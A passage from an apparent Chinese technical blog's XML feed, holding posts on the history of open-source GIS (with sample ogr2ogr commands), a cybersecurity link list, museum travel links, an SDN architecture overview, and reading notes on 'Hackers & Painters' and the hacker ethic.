    <content type="text"><![CDATA[摘要 开源 GIS 技术简史 1.1、GIS 的起源: MOSS and GRASS 1.2、GIS 的发展：GeoTools, GDAL, PostGIS 和 GeoServer 1.3、创新和教育：开源项目驱动 1.4、开源 GIS 的商业支持 Demo:A Full Stack Geo-enabled Internet of Things (IoT) Solution 一、开源 GIS 技术简史：从渺小到改变世界 原文: A History of Open Source GIS, from Humble Beginnings to World-Changing Applications | 23 Jun 2017 9:00am, by Anthony Calamito 数字制图和地理空间信息系统（Geographic Information System,GIS）的出现彻底改变了人们和对周围世界思考、互动的方式。将位置信息分层重叠用于决策的概念首先是由 Ian McHarg（景观设计师）在上世纪60年代提出。大约在同一时间，Roger Tomlinson —— 人们普遍称之为“GIS 之父”（Father of GIS） 完成了他的博士论文，主要研究使用计算方法处理分层的地理空间信息。罗杰随后致力于创建第一个计算机化的地理信息系统——加拿大地理信息系统（the Canada Geographic Information System），主要用于勘探测绘。 开源 GIS 的起源可以追溯到 1978 年的美国内政部（U.S. Department of the Interior）。从那时起，开源 GIS 基于不同的知识产权许可证，深入影响到许多行业的发展，包括政府和商业领域。美国劳工部称 GIS 技术为二十一世纪最重要的三大高增长产业之一。开源 GIS 技术在过去四十年的发展，直到今天演变出许多具有开创性和影响力的应用。 1.1、GIS 的起源: MOSS and GRASS1978年，美国内政部创建了 MOSS 系统（the Map Overlay and Statistical System ，地图叠加和统计系统）。MOSS 系统主要用于跟踪和评估矿山开发对环境、野生植物、野生动物及其迁徙方式的影响。这是第一个广泛部署，基于矢量（Vector Based）、可互动的地理信息系统。第一套 GIS 生产部署在小型机上。 随后不久，GRASS (“草” ，Geographic Resources Analysis Support System，地理资源分析支持系统）诞生。GRASS 系统拥有 350 多个模块用于处理栅格、拓扑向量、图像和图形数据，该软件最初设计提供给美国军方使用，以协助土地管理和环境规划。GRASS 系统广泛应用于科学研究和商业领域，包括地理空间数据管理和分析、图像处理、空间和时间建模以及创建图形和地图。 1.2、GIS 的发展：GeoTools, GDAL, PostGIS 和 GeoServer1996，利兹大学（the University of Leeds）在一个项目上开始创建基于 Java 开发语言的地理信息库，设计可以被纳入不同的应用需要。最终的成果是 GeoTools，一个可以操纵空间数据的开源库，在今天广泛应用于Web地理空间信息服务，网络地图服务和桌面应用程序。 四年后，一个跨平台的地理信息库 GDAL (Geospatial Data Abstraction Library, 地理空间数据抽象库) 出现了 。GDAL 使得 GIS 应用程序可以支持不同的数据格式，它还附带了各种有用的命令行工具，用于处理和转换各种数据格式。GDAL 支持超过 50 个栅格格式和20 个矢量格式的数据，它是全世界使用最广泛的地理空间数据访问库，支持的应用程序包括谷歌地球（Google Earth），GRASS，QGIS、FME（the Feature Manipulation Engine）和ArcGIS。 2001年，Refractions Research(加拿大 IT 咨询机构，创建于1998年)， 研发了开源项目 PostGIS ，使得空间数据可以存储在 Postgres 数据库。同年，GeoServer 创建，一个基于 Java 语言开发的应用程序，用于将空间数据发布为标准的Web服务。PostGIS 和 GeoServer 项目都取得了令人难以置信的成功，今天广泛应用于开源 GIS 数据库和 GIS 服务器。 1.3、创新和教育：开源项目驱动QGIS 被认为是在开源桌面 GIS 的鼻祖。QGIS 在2002发布，它集成了GRASS 系统的分析功能，以及 GDAL 对于数据格式支持，提供一个用户友好的桌面应用程序进行数据编辑、地图制图与分析。QGIS 可以和其他开源 GIS 互相操作，例如；管理 PostGIS 数据库，将数据发布到 GeoServer 作为 Web 服务。 在21世纪初，开源GIS 继续获得发展动力， 创建的开源孵化项目是 OSGeo 和 LocationTech。OSGeo 在 2006 年被推出，设计目标是支持开源 GIS 软件的协同开发，以及促进相关软件的广泛应用。LocationTech 是在 Eclipse 基金会(the Eclipse Foundation ) 中设立的一个工作组，旨在促进 GIS 技术在学术研究者，产业和社区之间的合作。 2011 年，“Geo for All” 创建。他是是开源地理空间基金会（Open Source Geospatial Foundation）的教育推广项目，目的是使人人都能接触到地理空间技术教育的机会。作为该基金会的工作成果，许多开源 GIS 的教育资源能在互联网上免费提供，包括 FOSS4G Academy 和 GeoAcademy。最后，“Geo for All” 致力于在世界各地建立了开源地理空间实验室和研究中心，以支持开源的地理空间技术开发、培训和研究。 1.4、开源 GIS 的商业支持在2013年，我工作的 Boundless 公司，成为第一家提供世界上最流行开源 GIS 应用软件的公司，包括数据库、服务器、桌面、网络、移动和云级别的商业支持和维护。Boundless 的产品套件确保了大型组织利用开源 GIS 技术的时候获得成功所需要的充分技术支持。该公司为最流行的开源 GIS 软件提供持续升级和补丁更新。 1.5、The Future and Beyond目前，现代计算的挑战要求将软件部署在云平台工作，并支持创建大量数据所带来的需求。两种开源 GIS 软件解决方案可以满足这些挑战，包括 GeoMesa，一个开源的分布式时空数据库，GeoTrellis，一个支持高性能应用的地理数据处理引擎。 这两种解决方案在2014中引入，可以处理云中的地理空间大数据。由于它们是建立在开源框架之上的，用户不需要商业软件许可证就可以使用而不必担心受到惩罚，而且可以按照用户需要进行弹性扩展。 开源 GIS 拥有美好的前景和巨大的潜力，它使得增强协作、共享有价值的数据和访问关键资源成为可能。凭借其众多的环境、政府、公共安全和健康应用，开源GIS 技术及其应用项目具有改变世界的潜力。 Demo:A Full Stack Geo-enabled Internet of Things (IoT) Solution Github:https://github.com/amollenkopf/dcos-iot-demo using Mesosphere’s open sourced Data Center Operating System (DC/OS) using Docker containerization and frameworks for Mesos including Marathon, Kafka, Spark, and Elasticsearch. 二、GIS Technology Applications12ogr2ogr -f GeoJSON -where &quot;NAME_1=&apos;CHINA&apos;&quot; CHM_geo.json CHN_adm1.shp ogr2ogr -f GeoJSON -where &quot;NAME_1=&apos;Guangdong&apos;&quot; Guangdong2_geo.json CHN_adm2.shp 十行代码看到空气质量指数(leafletCN/geojsonMap) Projects Rethinking GPS: Engineering Next-Gen Location at Uber 扩展阅读背景知识 图书馆|德克萨斯州大学奥斯汀分校 University of Texas at Austin|美军标准中国地图 China AMS Topographic Maps 美军军用地图|中国·广州|1950 年 1：250，000 比例尺 美国内政部 | U.S. Department of the Interior美国内政部（United States Department of the Interior，缩写：DOI）与大多数国家的内政部负责警察或安全事务不同，负责管理美国联邦政府拥有的土地、开采和保护美国的自然资源，并负责有关阿拉斯加、夏威夷原住民和美国岛屿地区领土事务。下辖美国地质调查局、国家公园管理局、土地管理局等机构。 美国地质调查局 | U.S. Geological Survey美国地质调查局（United States Geological Survey，缩写：USGS）是美国内政部辖下的科学机构，是内政部唯一一个纯粹的科学部门，有约一万名人员，总部设在弗吉尼亚州雷斯敦。美国地质调查局的科学家主要研究美国的地形、自然资源和自然灾害与其的应付方法；负责四大科学范畴：生物学、地理学、地质学和水文学。 美国地质调查局是美国的主要公共地图制作机构，制作线上的美国地图，又与商业公司合作向公众销售地图； 负责全球地震监测（美国地震资讯中心，科罗拉多），负责管理地震监测系统、地磁监测系统（公布磁场和实时磁力表）； 参与地球、月球和行星的探测和地图制作（从1962年开始）； 负责国家野生动植物健康中心：野生动物、植物和生态系统；在国内运行17个生物研究中心； 负责国家火山早期预警中心（2005年）：改善美国国内的169座火山的监测，研究新的监测方法。 Refractions Research(加拿大 IT 咨询机构，创建于1998年) 开源地理空间基金会（Open Source Geospatial Foundation） OSGeo 中国中心 | 在线地图资源库 GeoMesa，一个开源的分布式时空数据库 GeoTrellis，一个支持高性能应用的地理数据处理引擎 数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 数据可视化（八）Program,Data and Classical Music 数据可视化（十）公共数据源列表 参考文献 A History of Open Source GIS, from Humble Beginnings to World-Changing Applications | 23 Jun 2017 9:00am, by Anthony Calamito Mesosphere DC/OS Brings Large-Scale Real-Time Processing to Geospatial Data | 29 Sep 2017 6:00am, by Scott M. Fulton III 何苞旦:中国古人如何绘制地图]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Developer</tag>
        <tag>数据可视化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cyber-Security:国家队]]></title>
    <url>%2F2017%2F05%2F12%2FCyberSecurity-GFW%2F</url>
    <content type="text"><![CDATA[防御 DDoS Protection With IPtables: The Ultimate Guide 道高一尺，墙高一丈：互联网封锁是如何升级的(2008-2015) 攻击 揭秘中国网络战部队 | DAVID E. SANGER, DAVID BARBOZA, NICOLE PERLROTH |2013年2月19日 Open Source IPFire | A hardened open source Linux distribution that primarily performs as a router and a firewall 扩展阅读《The Cyber-Security Master》 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司 参考文献 数据包频度分析的网络代理加密流量特征提取方法 一种数据包频度分析的网络代理加密流量特征提取方法：本发明涉及一种基于数据包频度与数据包长度和时间戳之差聚类的机器学习Shadowsocks代理的加密流量特征提取方法，旨在为识别Shadowsocks加密过后的网页流量提供区分度大的流量特征。 Top VPNs secretly owned by Chinese firmsAlmost a third (30%) of the world’s top virtual private network (VPN) providers are secretly owned by six Chinese companies, according to a study by privacy and security research firm VPNpro.]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Cyber-Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[旅行指南|博物馆]]></title>
    <url>%2F2017%2F05%2F12%2FArtistic-Museum%2F</url>
    <content type="text"><![CDATA[摘要 上海·上海博物馆 南京·瞻园 广州·湿地公园 大英博物馆 上海博物馆 特色：官印、佛教造像、钱币 探宝：上海博物馆 大英博物馆 大英博物馆（谷歌地图在线） 南京博物院 旅行指南|江南园林|南京·瞻园 参观指南|南京博物院 生态资源 旅行指南|湿地公园 旅行指南|地质公园：河南·嵩山 参考文献]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>摄影</tag>
        <tag>Travel</tag>
        <tag>Artistic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SDN 技术指南（一）：架构概览]]></title>
    <url>%2F2017%2F05%2F12%2FSDN%2F</url>
    <content type="text"><![CDATA[摘要 Background：为什么需要 SDN SDN的主要解决方案 SDN的整体应用架构 SDN与网络安全 OpenFlow工作原理 OpenFlow在SDN架构中的角色 Background软件定义网络（Software-defined networking，SDN），一种新的网络架构。SDN 提出的控制与转发平面分离、网络状态集中控制、支持软件编程等理念并不是什么新鲜事，但是长久以来一直没有非常突破性的进展。 “为了让系统更好地工作，早期需要管理复杂性而后期需要提取简单性。” —唐·诺曼（Donald Arthur Norman） 目前 SDN 引起广泛关注得益于网络需求侧翻天覆地的变化：云计算业务（服务器虚拟化技术为代表）成为主流，移动互联网催生的大数据技术日益普及，包括网络在内的资源快速配置、弹性扩容、按需调用需求强烈。传统模式的弊端显现：网络设备硬件、操作系统和网络应用三部分紧耦合在一起，组成一个封闭系统，这三部分相互依赖、每一部分的创新和演进都要求其余部分做出同样的升级。 越来越多的网络新协议和新算法使得网络控制平面变得越来越复杂，但是现在的网络用户却对网络的易用性有更高的要求，希望网络具有更多的可编程能力，从而自动化、智能化网络管理。正如 SDN 的倡导者 Scott Shenker,U.C. Berkeley Professor 所言，网络发展目前还处于“管理复杂性”阶段，这样的架构严重阻碍了网络创新进程的开展。 SDN Solutions如何解决从“管理复杂性”阶段转变到“提取简单性”阶段呢？最先取得成功商用经验的是互联网企业Google。 Google 的 SDN 实践Google 基于 SDN 技术改造其骨干网 G-scale（Backbone Network，也称WAN网）。WAN网的主要任务是负责全球12个数据中心之间的互联，数据流量的内容包括：1. 用户数据备份，例如视频、图片、语音等；2. 跨数据中心存储访问，例如计算资源和存储资源分布不同；3. 大规模的数据同步。WAN 网成本高昂（包括很多海底光缆），而且存在数据流量大但是链路带宽利用率低的问题：为了实现负载均衡，同时避免大流量都被分发到同一个链路上导致丢包，Google不得不使用过量链路，提供比实际需要多得多的带宽，实际链路带宽利用率只有30%~40%，而且仍不可避免有的链路很空闲，有的链路产生拥塞，设备必须支持很大的包缓存，成本高。为了增强网络的可管理性，Google 首先在带宽分配和路径计算方面尝试。解决思路是当一个新的数据要开始传输时，应用程序会评估所需要耗用的带宽，为它选择一条最优路径（如负载最轻但非最短路径，虽不丢包但延时大），然后把这个应用对应的策略通过控制器（Controller）下发到定制的交换机中，跟选择的路径绑定在一起，从而整体上使链路带宽利用率达到最优。 SDN 架构中最显著的一个特点就是采用集中式控制器（Controller）： SDN ArchitectureSDN在应用中大体上可以可以划分为三层体系结构： 应用层（Application Layer） 控制层（Control Layer） 基础设施层（Infrastructure Layer） 不同层次之间通过接口通讯： 北向接口（Northbound interface） 南向接口（Sorthbound interface） 控制层（ Control Layer ）控制层是 SDN 控制器管理网络的基础设施，可以根据需要灵活选择多种控制器。在这一层中，控制器中包含大量业务逻辑，以获取和维护不同类型的网络信息、状态详细信息、拓扑细节、统计详细信息等。由于 SDN 控制器是用于管理网络的，所以它必须具有用于现实世界网络使用情况的控制逻辑，如交换、路由、二层VPN、三层VPN、防火墙安全规则、DNS、DHCP和集群，网络供应商和开源社区需要在自己的 SDN 控制器中实现自己的服务。这些服务会向上层（应用层）公开自己的API（通常是基于 REST ，这使网络管理员可以方便地使用应用程序上的 SDN 控制器的配置、管理和监控网络。 目前市场上的 SDN 控制器解决方案大致可以分为两类：大型网络设备厂商提供商业方案，例如 Cisco Open SDN controller, Juniper Contrail, Brocade SDN controller, 和来自 NEC 公司的 PFC SDN controller ；社区组织提供的开源方案，例如 OpenDaylight, Floodlight, Beacon, Ryu 等等。 Commercial Solutions: Cisco Open SDN Controller Juniper Contrail Brocade SDN controller PFC SDN controller(From NEC) Open Source Solutions: Beacon：由斯坦福大学开发，Java语言编写 Floodlight：源于Beacon，Big Switch Networks开发，Java语言编写，Apache许可证 OpenDaylight： Ryu：由 NTT 开发，Python 编写，能够与 OpenStack 平台整合，控制器API丰富 Mul: 由 Kulcloud 开发，内核采用 C 语言实现的多线程架构 NodeFlow: 由 Cisco 开发，基于 Node.js 的 OpenFlow 控制器，JavaScript 编写 Trema: 由 NEC 开发，Ruby/C 编写 NOX: 由 Nicira 开发，C++/Python编写，业界第一款 OpenFlow 控制器 POX: 由 Nicira 开发，是 NOX 的纯 Python 实现版本，目的是提供跨平台部署的便利性 基础设施层（ Infrastructure Layer ）基础设施层，由各种网络设备构成。它可以是数据中心的一组网络交换机和路由器。控制层负责管理底层物理网络，物理层的实现可以是支持 OpenFlow 的硬件交换机，随着虚拟化技术的完善，SDN 交换机可以是软件形态，例如 Open vSwitch (OVS) 就是一款基于开源技术实现的、能够与服务器虚拟化（Hypervisor）集成，具备交换机的功能，可以实现虚拟化组网。另外，OVS 支持传统的标准管理接口，例如 NetFlow 、sFlow 等，监测虚拟环境中的流量情况，详见 《浅谈基于数据分析的网络态势感知》 。 应用层（ Application Layer ）应用层对于开发者来说是开放区域，鼓励开发尽可能多的创新应用。包括网络的可视化：拓扑结构、网络状态、网络统计等；网络自动化相关应用：网络配置管理，网络监控，网络故障排除，网络安全策略等。SDN 应用程序可以为企业和数据中心网络提供各种端到端的解决方案。 例如，Brocade 应用实例： Brocade Flow Optimizer Brocade Virtual router Brocade Network advisor HPE 应用实例： HPE Network Optimizer HPE Network protector HPE Network visualizer NEC UNC for HP SDN VAN Controller Aricent SDN Load balancer TechM smart flow steering TechM server load balancer 南向接口（ Southbound interface ）控制层到基础设施层（网络交换机）通讯需要经过南向接口，目前主要的协议是 OpenFlow , NetConf，OVSDB 。 OpenFlow 协议是事实上的国际行业标准，NOX 、Onix 、Floodlight 等都是基于 OpenFlow 控制协议的开源控制器。作为一个开放的协议，OpenFlow 突破了传统网络设备厂商各自为政形成的设备能力接口壁垒。 北向接口（ Northbound interface ）北向接口：应用层 通过 API 的方式 与 SDN 控制器通讯。与南向接口不同，现在北向接口还缺少业界公认的标准，实现方案思路有的从用户角度出发、有的从运营商角度出发、有的从产品能力角度出发。技术风格上，部分传统的网络设备厂商倾向于在现有的设备上提供编程接口供业务App调用，许多上层应用的开发者也比较倾向于采用 REST API 接口的形式。 SDN 世界的两大山头SDN 技术体系目前还处于激烈竞争阶段，相关新产品和新技术层出不穷，如果要梳理大致可以分为两个流派： ONF(Open Networking Foundation，开放网络基金会 )董事会成员：德国电信（DT）、Facebook、 Google, Microsoft、Verizon、Yahoo!、日本 NTT 电信、高盛公司特点：面向用户 传统巨头大联盟（通过Linux基金会(Linux Foundation)合作）成员：思科（Cisco）、IBM、 微软、Big Switch、博科、思杰、戴尔、爱立信、富士通、英特尔、瞻博网络、微软、NEC、惠普、红帽和VMware协作项目：OpenDaylight（20130408）特点：大厂控制“嫌疑” SDN 标准化组织 IETF（Internet Engineering Task Force，互联网工程任务组）相对 ONF 而言，更多是由网络设备厂商主导，已经发布了多篇 RFC 文稿，内容涉及需求、框架、协议、转发但愿模型及 MIB 等。 ETSI NFV(Network Functions Virtualisation)成员：欧洲电信标准协会（European Telecommunications Standards Institute，ETSI）包括 AT&amp;T, 英国电信（BT）, 德国电信等特点：主要工作成果是 “网络功能虚拟化白皮书”，对NFV的定义、应用场景、基本功能，以及SDN等技术的关系等内容进行描述。 ITU-T （国际电信联盟通信标准化组织）由 ITU-T 指定的国际标准通常被称为建议（Recommendations）,2012年开始 SDN 与电信网络结合的标准研究。 SDN 与网络安全 （待补充）高可用性支持 如果 SDN 控制器只配置了一条源和目的路径，一旦链路失效如何快速将流量路由到正常链路？（持续监控网络拓扑、实时性） 外部连接的高可用性，支持VRRP（Virtual Router Redundancy Protocol）, MC-LAG(Multi-Chassis Link Aggregation Group)等 如何避免控制器成为新的单点故障源？（硬件、软件冗余设计，控制器集群化（OpenFlow v1.2开始引入），控制器集群同步能力） 企业级的授权和隔离 支持企业级的授权和认证 确保租户能在共享的网络基础资源上获得完全隔离的虚拟网络 抗恶意攻击能力 需要具备对控制类通讯的流量限制，怀疑被攻击是的告警能力 Discuss 云数据中心网络分析及安全技术方案实践(DPDK是一组快速处理数据包的开发平台及接口) | 王凯@云杉网络研发部 走近Google基于SDN的B4网络 | @盛科张卫峰 863项目：未来网络体系结构和创新环境(FINE) | @清华大学-毕军 百度：如何优化多数据中心的带宽成本？ 扩展阅读SDN技术专题 SDN 技术指南（一）: 架构概览 SDN 技术指南（二）：OpenFlow SDN 技术指南（三）：SDN Controller SDN 技术指南（四）：Open vSwitch SDN 技术指南（五）：NFV SDN 技术指南（六）：OpenStack or Kubernetes ? SDN 技术指南（七）：标准化组织 SDN 技术指南（八）：案例教学 SDN技术指南（十）：在线课程推荐 网络编程专题 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 新一代Ntopng网络流量监控—可视化和架构分析 网络安全专题 Cyber-Security: IPv6 &amp; Security Cyber-Security|香港拟增设网络安全与科技罪案总警司 云计算专题 AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017 参考文献 资讯：三星主办 ONOS Build 2017 What is the OpenDaylight Project (ODL)? 对话大神Scott Shenker：从物理博士到SDN’s Uncle | CSDN,2014 新贵与遗老：被集群路由器和POS绑架的运营商网络 | 徐建锋 一张复杂网络的生长过程| jaseywang.me]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cyber-Security:黑客与技术、产业及其精神世界]]></title>
    <url>%2F2017%2F05%2F09%2FCyberSecurity-Hacker%2F</url>
    <content type="text"><![CDATA[理解计算机的关键，则是要理解计算机背后的人。表面上这是一个机器的时代，但是实际上机器的社记者决定了我们的时代。 摘要 读书笔记|《黑客与画家》 《黑客与画家》（Hackers &amp; Painters） 的内容来自 Paul Graham 的博客，该文集主要讨论编程语言、黑客工作方法以及作者对于教育、版权制度和创业精神等方面的观点。书中的内容不但有助于了解计算机编程的历史、互联网行业规则，还有助于读者了解我们这个时代，走进 Hacker 的精神世界。 黑客（hacker）：解释一，最优秀的程序员；解释二，入侵计算机的人。本书特指第一种人。 原作者：Paul Graham （保罗·格雷厄姆）美国著名程序员、风险投资家、技术作家。Paul Graham 以 Lisp 方面的工作而知名，也是最早的Web应用Viaweb的创办者之一，后来以近5千万美元价格被雅虎收购，成为Yahoo! Store。他拥有哈佛大学应用科学（计算机方向）博士学位，担任麻省理工学院副教授，并且在罗德岛设计学院和佛罗伦萨绘画艺术学院学习过绘画。 翻译者：阮一峰阮一峰也是一位神人，是国内知名的 IT 技术专家。10 余年来发表了海量的网络文章，内容包含读书、经济学、历史、IT技术、医学、电影、音乐和美术、政治学、科学、创业、互联网等等等，我知道的好像他都知道。无论是否从事 IT 职业，阅读他的博客相信都会受益良多。 怎么理解编程语言？ 程序员非常 忠于 他们心爱的语言。编程语言与其说它是技术，还不如说是程序员的思考模式。编程语言是技术和宗教的混合物。（p178） 在不考虑其他因素的情况下，总的来看，对于应用程序来说，选择总体上最强大、效率也在可接受范围内的编程语言。 如果从 图灵等价（Turing-equivalent） 的角度看来看，所有语言都是一样强大的，但是这对程序员没有意义。关于强大很难正式定义，有一个解释方法是一些功能在一种语言是内置的，但是在另一种语言中需要修改解释器才能做到，那么前者就比后者更强大。 如果A语言有一个运算符可以移除字符串中的空格，而B语言没有这个运算符，这种情况则不足以称A语言比B语言强大，因为你可以在B语言里写一个函数实现这个功能。但是A语言支持某种高级功能（假定是递归），而B语言不支持，你就不可能通过自己编写函数库解决了，这就代表A语言比B语言更强大。 例外情况：1）如果在开发的程序必须与另一个程序紧密配合，那么可能最好还是使用后者的开发语言。2）如果程序只是要做一些很简单的事（比如整数运算或位操作），那就不妨使用一种比较靠近机器的低层次语言，这样运行起来会更快一些。3）如果程序只是为了特定场合一次性使用，那么你最好根据自己需要解决的问题选择具有强大函数库的语言。 论编程方法 应用软件运行速度提升的关键在于有一个好的性能分析器(profiler)帮助指导程序开发。(p165 ) 书上说，调试（debugging）是最后的步骤，用来纠正打字的错误和疏忽。可是我的工作方法看上去却像编程就是在调试。编程语言是用来帮助思考程序的，而不是用来表达你已经想好的程序。它应该是一支铅笔，而不是一支钢笔。(p22) 评价一种语言的优劣不能简单地看最后的程序是否表达得很漂亮，而要看程序从无到有的那条完成路径是否很漂亮。（p215） 源代码应该可以自己解释自己。 程序写出来是给人看的，附带能在机器上运行。—— 《计算机程序的结构与解释》 不要把编程语言看成那些已完成的程序的表达方式，而应该把它理解成促进程序从无到有的一种媒介。这里的意思是说，成品的材料和开发时用的材料其实是不一样的。搞艺术的人都知道，这两个阶段往往需要不同的媒介。比如，大理石是一种非常良好、耐用的材料，很适合用于最后的成品，但是它极其缺乏弹性和灵活性，所以不适合在构思阶段用来做模型。（p215） 论思想自由Paul Graham 在《黑客与画家》一书中，始终强调思想自由对人才、对技术进步和公众利益的极端重要性。例如： 如果别人告诉你该相信什么，你就真的相信了，那么你就会和别人一样犯下同样的错误。（p35） 流行的思想观点与流行的服饰产生方式不尽相同，但是，它们的传播路径却很相似。第一批的接受者总是带有很强的抱负心，他们有自觉的精英意识，想把自己与普通人区分开来。当流行趋势确立以后，第二批接受者就加入进来了，人数比上一批庞大得多，恐惧心在背后驱使着他们。他们接受流行，不是因为想要与众不同，而是因为害怕与众不同。（p43） 只有保持一定的距离才能观察到人们观念的变化，发现流行（也就是人们自以为是正确的事情）到底是什么。如果你想要清晰地思考，就必须远离人群。（p50） 想要做出优秀作品，你需要一个什么问题都能思考的大脑。 尤其是那些不应该思考的问题，你的大脑也要养成思考它们的习惯。优秀作品往往来自于其他人忽视的想法，而最被忽视的想法就是那些禁止的思想观点。 智力越高的人，越愿意去思考那些惊世骇俗的思想观点。这不仅仅因为聪明人本身很积极地寻找传统观念的漏洞，还因为传统观念对他们的束缚力很小，很容易摆脱。从他们的衣着上就可以看出这一点：不受传统观念束缚的人，往往也不会穿流行的衣服。 做一个异端是有回报的，不仅是在科学领域，在任何有竞争的地方，只要你能看到别人看不到或不敢看的东西，你就有很大的优势。（p45） 如果你能“远远地”跳出传统思维，提出让别人一听就脑袋轰一声炸开的惊人观点，那么你就在“小小地”跳出传统思维方面不会有任何困难。要知道，人们把后面的这种情况称为“创新”。(p46) 在思想自由和言论自由的关系上，Paul Graham 大声疾呼：自由思考比畅所欲言更重要！。 如果你感到一定要跟那些人辩个明白，绝不咽下这口气，一定要把话说清楚，结果很可能是从此你再也无法自由理性地思考了。我认为这样做不可取，更好的方法是在思想和言论之间画一条明确的界限。在心理无所不想，但是不一定要说出来。你的思想是一个地下组织，绝不要把那里发生的时期一股脑说给外人听。（p47） “守口如瓶”的真正缺点在于，你从此无法享受讨论带来好处了。讨论一个观点会产生更多的观点，不讨论就什么观点也没有。 找一些信得过的知己，只与他们畅所欲言、无所不谈。这样不仅可以获得新观点，还可以用来选择朋友。能够一起谈论“异端邪说” 并且不会因此气急败坏的人，就是你最应该认识的朋友。 论知识产权关于知识产权制度，从诞生的那一天起实际上就存在支持/反对两大阵营。黑客大多坚定地站在反对派阵营，或者说黑客群体是反对知识产权制度中最重要的一支力量。 首先，对于美国而言，其知识产权制度拥有 200 多年的历史，拥有强大的知识产权保护体系。 国会应有权……促进科学和实用艺术的进步，确保有限时报作者和发明者的独家权利，以及他们各自的著作和发现….. 美国宪法第一章第8款 1789 年《宪法》第一章第 8 款 1790年4月10日，美国第一部版权法。保护范围：图书、地图和图表，之后扩展到摄影、录音和电影。（大清国乾隆五十五年，同年本杰明·富兰克林&amp;亚当·斯密逝世） 1909年版权法案。未经授权的复制的定义必须是从视觉上可以看到或阅读的一种形式（音乐卷片、ROM芯片上下象棋的游戏等都不在保护之列）。 1976年和1980年，版权法修改，使之涵盖了计算机软件。 历史上，机器内部的控制系统一直是物理装置：齿轮、杠杆和连接器等。但是，计算机的出现使得机器的控制系统逐渐变成了软件（包括数据（Data）在内的统称，例如胶片上的歌曲属于用物理方法压制在盘片上的数据）。互联网的出现使得复制品更容易流通，相关产业公司推动政府通过了严厉的法律，保护知识产权，作为对新技术的回应。 黑客反对知识产权制度的观点中，最重要的一条是保护人的“思想自由”。 对于版权和专利这样的制度，黑客深感担忧。他们感到，保护“知识产权”的力度不断增大，已经威胁到了他们完成工作所必需的“思想自由”。（p54） 立法者的愿意可能是好的。但是，他们也许没有意识到，这样的法律弊大于利。(p55) 黑客（Hacker）群体在许多方面都表现出强烈的精英意识和自觉。例如，他们坚定地认为，知识产权制度无益于增加公众福利。不仅破坏思想自由权利，而且有加强极权主义制度的巨大危险。他们坚信，保护人的思想自由，就是保护国家持续发展根本动力，只有获得独步天下的技术优势，才有可能增加公众福利，反之，则是非常危险的。 在我看来，一个人们拥有言论自由和行动自由的社会，往往最有可能采纳最优方案，而不是采纳最有权势的人提出的方案。专制国家会变成腐败国家，腐败国家会变成贫穷国家，贫穷国家会变成弱小国家。…. 极权主义制度只要形成了，就很难废除。黑客对于公民自由是非常敏感的，因为这对他们至关重要。他们远远地就能感到极权主义的威胁，好比动物能够感知即将来临的暴风雨。（p57） 黑客伦理（hacker ethic）黑客伦理（hacker ethic）是黑客文化中普遍存在的道德价值观和哲学观。起源于上世纪50~60年年代的麻省理工学院（MIT），一个比较流行的版本是由记者 Steven Levy在 1984 年出版的《黑客：计算机革命的英雄》（Hackers: Heroes of the Computer Revolution）一书种提出。 (1)使用计算机以及所有有助于了解这个世界本质的事物都不应该收到任何限制。任何事情都应该亲手尝试。( Access to computers — and anything that might teach you something about the way to the world works — should be unlimited and total. Always yield to the Hands-On Imperative! ) (2)所有信息应该都是自由的。(All information should be free.) (3)不信任权威，提倡去中心化。(Mistrust Authority — Promote Decentralization.) (4)判断一名黑客的水平应该看他的技术能力，而不是他的学历、年龄或地位等其他标准。(Hackers should be judged by their hacking, not bogus criteria such as degrees, age, race, or position. ) (5)你可以用计算机创造美和艺术。(You can create art and beauty on a computer.) (6)计算机使生活更美好。(Computers can change your life for the better.) “黑客伦理”的一个必然推论就是，黑客不服从管教，具有叛逆精神。黑客通常对管理者强加的，限制他们行为的愚蠢规定不屑一顾，会找出规避的方法。 Paul Graham：The people who break rules that are the source of America’s wealth and power.只有那些不服从管教的人们，才是美国财富与力量的源泉。 普通法我们已经发现黑客习俗和英裔美国人普通法传统下的土地所有制理论在逻辑上非常类同 。从历史上讲 1 2 ，欧洲部落文化发明了这些传统 ，并改善了他们的冲突解决体系 ——从表达不清的 、半意识的习惯体系发展到掌握在部落智者记忆中明确的习惯法 ，并最终发展成为成书面制度 。也许 ，当我们人数不断增加 、当所有新成员的文化移入变得困难时 ，黑客文化也该做一些类似的事 ——将一些优秀实践发展成为规范 ，解决开源项目中可能出现的各种争议 ，并发展出一种可以让社区中资深成员调解纠纷的仲裁传统 。 论设计者的品味 黑客新想法的最佳来源，并非那些名字里有“计算机”三个字的理论领域，而是来自于其他创作领域。与其到“计算机理论”领域寻找创意，你还不如在绘画中寻找创意。（p21） 关于软件“版本” 软件是连续性渐变的，某些更新也许比较重大，但是“版本”概念不适用于互联网软件。（我们）什么时候 